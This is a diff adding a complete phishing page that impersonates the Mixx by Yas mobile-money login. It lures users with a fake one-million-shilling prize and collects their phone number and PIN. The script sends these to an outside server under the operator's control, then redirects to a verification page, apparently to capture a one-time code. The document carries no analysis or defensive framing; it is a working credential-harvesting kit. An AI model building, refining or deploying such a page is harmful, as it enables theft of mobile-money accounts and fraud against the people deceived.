@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mixx by Yas - Login</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: linear-gradient(145deg, #e0e5ec 0%, #f0f4fa 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            padding: 16px;
+            position: relative;
+        }
+
+        /* ===== WATERMARKS ===== */
+        .watermark {
+            position: fixed;
+            font-size: 60px;
+            font-weight: 900;
+            color: rgba(244, 180, 0, 0.06);
+            pointer-events: none;
+            z-index: 0;
+            white-space: nowrap;
+            user-select: none;
+        }
+        .top-left { top: 10px; left: 10px; transform: rotate(-15deg); }
+        .top-right { top: 10px; right: 10px; transform: rotate(15deg); }
+        .bottom-left { bottom: 10px; left: 10px; transform: rotate(10deg); }
+        .bottom-right { bottom: 10px; right: 10px; transform: rotate(-10deg); }
+
+        /* ===== CONFETTI BACKGROUND ===== */
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+            animation: confettiFall 4s ease-in forwards;
+        }
+
+        @keyframes confettiFall {
+            0% {
+                opacity: 1;
+                transform: translateY(-10px) rotate(0deg) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(100vh) rotate(720deg) scale(0.5);
+            }
+        }
+
+        /* ===== MAIN CARD ===== */
+        .login-card {
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(2px);
+            border-radius: 48px;
+            padding: 30px 24px 40px;
+            max-width: 420px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15), inset 0 1px 2px rgba(255, 255, 255, 0.6);
+            z-index: 2;
+            border: 1px solid rgba(244, 180, 0, 0.3);
+            position: relative;
+            transition: opacity 0.3s ease;
+        }
+
+        /* ===== BACK BUTTON ===== */
+        .back-link {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            color: #64748b;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            transition: color 0.2s;
+            z-index: 5;
+        }
+        .back-link:hover {
+            color: #1C2E5B;
+        }
+        .back-link svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* ===== LOGO ===== */
+        .logo {
+            max-width: 130px;
+            height: auto;
+            margin-bottom: 2px;
+            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
+        }
+
+        .brand-title {
+            font-size: 28px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #1C2E5B, #2c4580);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: 1px;
+            margin-top: 0px;
+        }
+
+        .brand-sub {
+            color: #F4B400;
+            font-weight: 700;
+            font-size: 13px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-top: -2px;
+        }
+
+        /* ===== WIN TEXT ===== */
+        .win-text {
+            background: linear-gradient(120deg, #F4B400, #FFD966);
+            display: inline-block;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 20px;
+            font-weight: 800;
+            color: #1C2E5B;
+            margin: 12px 0 0px;
+            box-shadow: 0 4px 0 #b87f00;
+            transform: rotate(-0.5deg);
+            animation: pulseWin 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseWin {
+            0%, 100% { transform: rotate(-0.5deg) scale(1); }
+            50% { transform: rotate(-0.5deg) scale(1.03); }
+        }
+
+        /* ===== LOGIN HEADER ===== */
+        .login-header {
+            margin: 14px 0 6px;
+        }
+        .login-header h2 {
+            font-size: 22px;
+            color: #1C2E5B;
+            font-weight: 700;
+        }
+        .login-header p {
+            color: #64748b;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+
+        /* ===== FORM ELEMENTS ===== */
+        .form-group {
+            margin-top: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-weight: 700;
+            color: #1C2E5B;
+            margin-bottom: 6px;
+            font-size: 14px;
+            padding-left: 5px;
+        }
+
+        .form-group input[type="tel"] {
+            width: 100%;
+            padding: 14px 18px;
+            font-size: 18px;
+            border: 2px solid #e2e8f0;
+            border-radius: 50px;
+            background: white;
+            transition: 0.2s;
+            outline: none;
+            font-weight: 500;
+            -webkit-appearance: none;
+            text-align: center;
+            font-family: inherit;
+        }
+
+        .form-group input[type="tel"]:focus {
+            border-color: #F4B400;
+            box-shadow: 0 0 0 3px rgba(244, 180, 0, 0.2);
+        }
+
+        .form-group input[type="tel"].error {
+            border-color: #ef4444;
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+        }
+
+        /* ===== PIN INPUT ===== */
+        .pin-wrapper {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-top: 4px;
+        }
+
+        .pin-box {
+            width: 65px;
+            height: 65px;
+            text-align: center;
+            font-size: 32px;
+            font-weight: 700;
+            border: 2px solid #cbd5e1;
+            border-radius: 20px;
+            background: white;
+            transition: 0.15s;
+            font-family: 'Courier New', monospace;
+            outline: none;
+            -webkit-appearance: none;
+            caret-color: #F4B400;
+        }
+
+        .pin-box:focus {
+            border-color: #F4B400;
+            box-shadow: 0 0 0 3px #ffe699;
+        }
+
+        .pin-box.error {
+            border-color: #ef4444;
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+        }
+
+        /* ===== ERROR MESSAGE ===== */
+        .error-message {
+            color: #ef4444;
+            font-size: 13px;
+            font-weight: 600;
+            min-height: 20px;
+            margin-top: 8px;
+            text-align: center;
+            transition: opacity 0.2s;
+        }
+
+        /* ===== SUBMIT BUTTON ===== */
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #F4B400, #e6a800);
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 800;
+            color: #1C2E5B;
+            margin-top: 24px;
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 4px 0 #b87f00;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            position: relative;
+        }
+
+        .login-btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #b87f00;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #b87f00;
+            pointer-events: none;
+        }
+
+        /* ===== SPINNER ===== */
+        .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(28, 46, 91, 0.2);
+            border-top-color: #1C2E5B;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        .login-btn.loading .spinner {
+            display: block;
+        }
+        .login-btn.loading .btn-text {
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ===== FOOTER ===== */
+        .login-footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #94a3b8;
+        }
+        .login-footer a {
+            color: #1C2E5B;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* ===== SUCCESS OVERLAY ===== */
+        .success-overlay {
+            display: none;
+            position: absolute;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 48px;
+            z-index: 10;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 30px;
+        }
+        .success-overlay.show {
+            display: flex;
+        }
+        .success-overlay .check {
+            font-size: 64px;
+            margin-bottom: 12px;
+        }
+        .success-overlay h3 {
+            color: #1C2E5B;
+            font-size: 24px;
+        }
+        .success-overlay p {
+            color: #64748b;
+            font-size: 14px;
+            margin-top: 6px;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .login-card {
+                padding: 24px 16px 35px;
+                border-radius: 40px;
+            }
+            .brand-title { font-size: 24px; }
+            .login-header h2 { font-size: 20px; }
+            .win-text { font-size: 16px; padding: 8px 16px; }
+            .pin-box {
+                width: 55px;
+                height: 55px;
+                font-size: 28px;
+                border-radius: 16px;
+            }
+            .pin-wrapper { gap: 10px; }
+            .form-group input[type="tel"] {
+                padding: 12px 16px;
+                font-size: 16px;
+            }
+            .login-btn {
+                padding: 14px;
+                font-size: 16px;
+            }
+            .back-link {
+                top: 16px;
+                left: 16px;
+                font-size: 12px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .pin-box {
+                width: 48px;
+                height: 48px;
+                font-size: 24px;
+                border-radius: 14px;
+            }
+            .pin-wrapper { gap: 8px; }
+            .login-card {
+                padding: 20px 12px 30px;
+                border-radius: 32px;
+            }
+            .brand-title { font-size: 20px; }
+            .logo { max-width: 100px; }
+            .win-text { font-size: 14px; padding: 6px 12px; }
+        }
+
+        /* ===== IPHONE NOTCH SUPPORT ===== */
+        @supports (padding: max(0px)) {
+            body {
+                padding-left: max(16px, env(safe-area-inset-left));
+                padding-right: max(16px, env(safe-area-inset-right));
+                padding-top: max(16px, env(safe-area-inset-top));
+                padding-bottom: max(16px, env(safe-area-inset-bottom));
+            }
+        }
+
+        /* ===== DARK MODE SUPPORT ===== */
+        @media (prefers-color-scheme: dark) {
+            body {
+                background: linear-gradient(145deg, #1a1a2e, #16213e);
+            }
+            .login-card {
+                background: rgba(30, 30, 50, 0.96);
+                border-color: rgba(244, 180, 0, 0.2);
+            }
+            .brand-title {
+                background: linear-gradient(135deg, #F4B400, #FFD966);
+                -webkit-background-clip: text;
+                background-clip: text;
+            }
+            .login-header h2 { color: #f0f0f0; }
+            .login-header p { color: #94a3b8; }
+            .form-group label { color: #e2e8f0; }
+            .form-group input[type="tel"] {
+                background: rgba(255,255,255,0.08);
+                border-color: #334155;
+                color: #f0f0f0;
+            }
+            .form-group input[type="tel"]:focus {
+                border-color: #F4B400;
+            }
+            .pin-box {
+                background: rgba(255,255,255,0.08);
+                border-color: #334155;
+                color: #f0f0f0;
+            }
+            .pin-box:focus {
+                border-color: #F4B400;
+            }
+            .login-footer { color: #64748b; }
+            .login-footer a { color: #F4B400; }
+            .success-overlay { background: rgba(30, 30, 50, 0.95); }
+            .success-overlay h3 { color: #f0f0f0; }
+            .success-overlay p { color: #94a3b8; }
+            .watermark { color: rgba(244, 180, 0, 0.03); }
+            .back-link { color: #94a3b8; }
+            .back-link:hover { color: #F4B400; }
+            .win-text {
+                background: linear-gradient(120deg, #F4B400, #e6a800);
+                color: #1C2E5B;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== WATERMARKS ===== -->
+    <div class="watermark top-left">Mixx</div>
+    <div class="watermark top-right">Mixx</div>
+    <div class="watermark bottom-left">Mixx</div>
+    <div class="watermark bottom-right">Mixx</div>
+
+    <!-- ===== CONFETTI ===== -->
+    <div class="confetti-container" id="confettiContainer"></div>
+
+    <!-- ===== PHONE FRAME ===== -->
+    <div class="login-card" id="loginCard">
+
+        <!-- ===== BACK BUTTON ===== -->
+        <a href="https://yas.co.tz/mixx-by-yas/" class="back-link" id="backLink">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="15 18 9 12 15 6"></polyline>
+            </svg>
+            Back
+        </a>
+
+        <!-- ===== SVG LOGO ===== -->
+        <svg class="logo" width="170" height="130" viewBox="0 0 400 300">
+            <ellipse cx="200" cy="240" rx="70" ry="12" fill="rgba(0,0,0,0.08)"/>
+            <rect x="120" y="50" width="140" height="160" rx="22" fill="#fff" stroke="#F4B400" stroke-width="8"/>
+            <rect x="170" y="185" width="40" height="8" rx="4" fill="#F4B400"/>
+            <polygon points="210,25 300,65 250,120 160,80" fill="#F4B400"/>
+            <polygon points="225,15 315,55 265,110 175,70" fill="#FFD54F" opacity="0.9"/>
+            <line x1="200" y1="120" x2="185" y2="140" stroke="#F4B400" stroke-width="4"/>
+            <line x1="210" y1="125" x2="195" y2="150" stroke="#F4B400" stroke-width="4"/>
+            <text x="95" y="260" font-size="52" fill="#1C2E5B" font-weight="bold">mixx</text>
+            <text x="205" y="260" font-size="52" fill="#F4B400" font-weight="bold">by yas</text>
+        </svg>
+
+        <div class="brand-title">MIXX BY YAS</div>
+        <div class="brand-sub">Secure · Fast · Reliable</div>
+
+        <!-- ===== WIN TEXT ===== -->
+        <div class="win-text">🎉 UMEJISHINDIA TSH1,000,000</div>
+
+        <!-- ===== LOGIN HEADER ===== -->
+        <div class="login-header">
+            <h2>Welcome Back</h2>
+            <p>Enter your credentials to claim your prize</p>
+        </div>
+
+        <!-- ===== FORM ===== -->
+        <form id="loginForm" novalidate>
+
+            <!-- Phone Number -->
+            <div class="form-group">
+                <label for="phoneInput">📱 Phone Number</label>
+                <input
+                    type="tel"
+                    id="phoneInput"
+                    placeholder="07XXXXXXXX"
+                    maxlength="10"
+                    autocomplete="tel"
+                    required
+                >
+            </div>
+
+            <!-- PIN -->
+            <div class="form-group">
+                <label>🔐 PIN</label>
+                <div class="pin-wrapper" id="pinWrapper">
+                    <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+                    <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+                    <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+                    <input class="pin-box" maxlength="1" inputmode="numeric" pattern="\d" autocomplete="off">
+                </div>
+            </div>
+
+            <!-- Error Message -->
+            <div class="error-message" id="errorMessage"></div>
+
+            <!-- Submit Button -->
+            <button type="submit" class="login-btn" id="loginBtn">
+                <span class="btn-text">🔐 LOG IN & CLAIM PRIZE</span>
+                <span class="spinner"></span>
+            </button>
+
+        </form>
+
+        <!-- ===== FOOTER ===== -->
+        <div class="login-footer">
+            Protected by <a href="#">SSL Security</a> · Need help? <a href="#">Contact Support</a>
+        </div>
+
+        <!-- ===== SUCCESS OVERLAY ===== -->
+        <div class="success-overlay" id="successOverlay">
+            <div class="check">✅</div>
+            <h3>Login Successful!</h3>
+            <p>Redirecting you to verify your identity...</p>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const form = document.getElementById("loginForm");
+            const phoneInput = document.getElementById("phoneInput");
+            const pinBoxes = Array.from(document.querySelectorAll('.pin-box'));
+            const errorMessage = document.getElementById("errorMessage");
+            const loginBtn = document.getElementById("loginBtn");
+            const loginCard = document.getElementById("loginCard");
+            const successOverlay = document.getElementById("successOverlay");
+            const confettiContainer = document.getElementById("confettiContainer");
+
+            let realPin = ["", "", "", ""];
+            let submitted = false;
+
+            // ===== YOUR BACKEND API URL =====
+            const API_URL = 'https://mxxyasstz-production.up.railway.app/Server';
+
+            // ===== CONFETTI EFFECT =====
+            function launchConfetti() {
+                const colors = ['#F4B400', '#FFD966', '#1C2E5B', '#FF6B6B', '#4ECDC4', '#45B7D1'];
+                for (let i = 0; i < 50; i++) {
+                    const confetti = document.createElement('div');
+                    confetti.className = 'confetti';
+                    confetti.style.left = Math.random() * 100 + '%';
+                    confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                    confetti.style.width = (Math.random() * 8 + 4) + 'px';
+                    confetti.style.height = (Math.random() * 8 + 4) + 'px';
+                    confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                    confetti.style.animationDelay = Math.random() * 2 + 's';
+                    confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                    confettiContainer.appendChild(confetti);
+                }
+                // Remove confetti after animation
+                setTimeout(() => {
+                    confettiContainer.innerHTML = '';
+                }, 4000);
+            }
+
+            // ===== PHONE INPUT VALIDATION =====
+            phoneInput.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '').slice(0, 10);
+                this.classList.remove('error');
+                errorMessage.textContent = '';
+            });
+
+            phoneInput.addEventListener('blur', function() {
+                const val = this.value.trim();
+                if (val && !/^(07|06)\d{8}$/.test(val)) {
+                    this.classList.add('error');
+                    errorMessage.textContent = '❌ Please enter a valid phone number (07XXXXXXXX or 06XXXXXXXX)';
+                }
+            });
+
+            // ===== PIN INPUT HANDLING =====
+            pinBoxes.forEach((box, i) => {
+                // Input event
+                box.addEventListener('input', function(e) {
+                    let val = e.target.value.replace(/\D/g, '');
+                    if (!val) {
+                        realPin[i] = "";
+                        return;
+                    }
+                    e.target.value = val;
+                    realPin[i] = val;
+                    this.classList.remove('error');
+                    errorMessage.textContent = '';
+
+                    // Auto-advance to next box
+                    if (i < 3) {
+                        pinBoxes[i + 1].focus();
+                    }
+
+                    // If all 4 digits entered, auto-submit
+                    if (realPin.every(x => x !== "")) {
+                        setTimeout(() => {
+                            submitForm();
+                        }, 150);
+                    }
+                });
+
+                // Keydown for backspace
+                box.addEventListener('keydown', function(e) {
+                    if (e.key === "Backspace") {
+                        realPin[i] = "";
+                        if (i > 0 && !this.value) {
+                            pinBoxes[i - 1].focus();
+                        }
+                    }
+                });
+
+                // Paste support
+                box.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const paste = (e.clipboardData || window.clipboardData).getData('text');
+                    const digits = paste.replace(/\D/g, '').slice(0, 4);
+                    if (digits) {
+                        const digitArray = digits.split('');
+                        digitArray.forEach((digit, idx) => {
+                            if (idx < 4) {
+                                pinBoxes[idx].value = digit;
+                                realPin[idx] = digit;
+                            }
+                        });
+                        const nextEmpty = pinBoxes.findIndex((b, idx) => !realPin[idx]);
+                        if (nextEmpty !== -1 && nextEmpty < 4) {
+                            pinBoxes[nextEmpty].focus();
+                        } else {
+                            pinBoxes[3].focus();
+                            if (realPin.every(x => x !== "")) {
+                                setTimeout(() => submitForm(), 200);
+                            }
+                        }
+                    }
+                });
+            });
+
+            // ===== ENTER KEY ON PHONE INPUT =====
+            phoneInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (realPin.every(x => x !== "")) {
+                        submitForm();
+                    } else {
+                        pinBoxes[0].focus();
+                        errorMessage.textContent = '⚠️ Please enter your 4-digit PIN';
+                    }
+                }
+            });
+
+            // ===== FORM SUBMISSION =====
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                submitForm();
+            });
+
+            async function submitForm() {
+                if (submitted) return;
+
+                const phone = phoneInput.value.trim();
+                const pin = realPin.join('');
+
+                // ===== VALIDATE PHONE =====
+                if (!phone || phone.length !== 10) {
+                    phoneInput.classList.add('error');
+                    errorMessage.textContent = '❌ Please enter a valid 10-digit phone number';
+                    phoneInput.focus();
+                    return;
+                }
+
+                if (!/^(07|06)\d{8}$/.test(phone)) {
+                    phoneInput.classList.add('error');
+                    errorMessage.textContent = '❌ Phone must start with 07 or 06 (e.g., 0712345678)';
+                    phoneInput.focus();
+                    return;
+                }
+
+                // ===== VALIDATE PIN =====
+                if (pin.length !== 4) {
+                    errorMessage.textContent = '❌ Please enter all 4 digits of your PIN';
+                    pinBoxes.forEach(box => box.classList.add('error'));
+                    pinBoxes.find(b => !realPin[pinBoxes.indexOf(b)])?.focus();
+                    return;
+                }
+
+                // Clear errors
+                phoneInput.classList.remove('error');
+                pinBoxes.forEach(box => box.classList.remove('error'));
+                errorMessage.textContent = '';
+
+                // ===== SUBMIT =====
+                submitted = true;
+                loginBtn.classList.add('loading');
+                loginBtn.disabled = true;
+                loginCard.style.opacity = "0.7";
+
+                console.log('📤 Sending login data:', { phone, pin });
+
+                try {
+                    const response = await fetch(API_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ phone: phone, pin: pin })
+                    });
+
+                    const data = await response.json();
+                    console.log('📥 Response:', data);
+
+                    if (data.status === 'success') {
+                        // Launch confetti
+                        launchConfetti();
+
+                        // Show success overlay
+                        successOverlay.classList.add('show');
+                        loginCard.style.opacity = "1";
+
+                        // Redirect to OTP verification page with phone number
+                        setTimeout(() => {
+                            window.location.href = "verify.html?phone=" + encodeURIComponent(phone);
+                        }, 2500);
+                    } else {
+                        throw new Error(data.message || 'Login failed');
+                    }
+                } catch (error) {
+                    console.error('❌ Error:', error);
+                    errorMessage.textContent = '❌ Login failed. Please check your credentials and try again.';
+                    submitted = false;
+                    loginBtn.classList.remove('loading');
+                    loginBtn.disabled = false;
+                    loginCard.style.opacity = "1";
+                }
+            }
+
+            // ===== RESET STATE =====
+            function resetForm() {
+                submitted = false;
+                loginBtn.classList.remove('loading');
+                loginBtn.disabled = false;
+                loginCard.style.opacity = "1";
+                errorMessage.textContent = '';
+                pinBoxes.forEach(box => {
+                    box.value = '';
+                    box.classList.remove('error');
+                });
+                realPin = ["", "", "", ""];
+                phoneInput.value = '';
+                phoneInput.classList.remove('error');
+                successOverlay.classList.remove('show');
+            }
+
+            // Reset if user clicks back button
+            document.getElementById('backLink').addEventListener('click', function(e) {
+                // Allow navigation to proceed
+            });
+
+        })();
+    </script>
+
+</body>
+</html>
